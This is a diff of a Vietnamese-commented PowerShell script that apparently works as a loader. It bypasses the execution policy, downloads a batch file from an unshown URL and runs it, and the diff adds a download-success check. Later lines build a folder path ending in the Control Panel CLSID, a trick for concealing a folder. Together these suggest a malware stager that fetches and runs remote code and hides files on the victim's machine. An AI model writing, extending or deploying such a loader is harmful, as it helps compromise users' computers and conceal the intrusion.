@@ -6,6 +6,7 @@ Set-ExecutionPolicy Bypass -Scope Process -Force
 
 $skid = "skid"
 
+# Kiểm tra xem script có quyền quản trị không
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
     try {
         # Tải xuống tệp batch
@@ -15,8 +16,13 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
         Write-Output "Tải xuống tệp từ $url"
         Invoke-WebRequest -Uri $url -OutFile $outputFile -ErrorAction Stop
 
-        # Thực thi tệp batch với quyền quản trị
-        Write-Output "Khởi chạy tệp batch với quyền quản trị."
+        # Kiểm tra xem tệp đã được tải xuống thành công không
+        if (-not (Test-Path $outputFile)) {
+            throw "Tệp tải xuống không tồn tại: $outputFile"
+        }
+
+        # Thực thi tệp batch mà không cần quyền quản trị
+        Write-Output "Khởi chạy tệp batch."
         Start-Process -FilePath $outputFile -Wait -ErrorAction Stop
         
         # Kết thúc tiến trình PowerShell sau khi thực thi tệp batch
@@ -27,6 +33,7 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
         Write-Error "Lỗi xảy ra: $_"
     }
 }
+
 
 $rdir = "C:\Users\hai1723"
 $dir = "$rdir.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
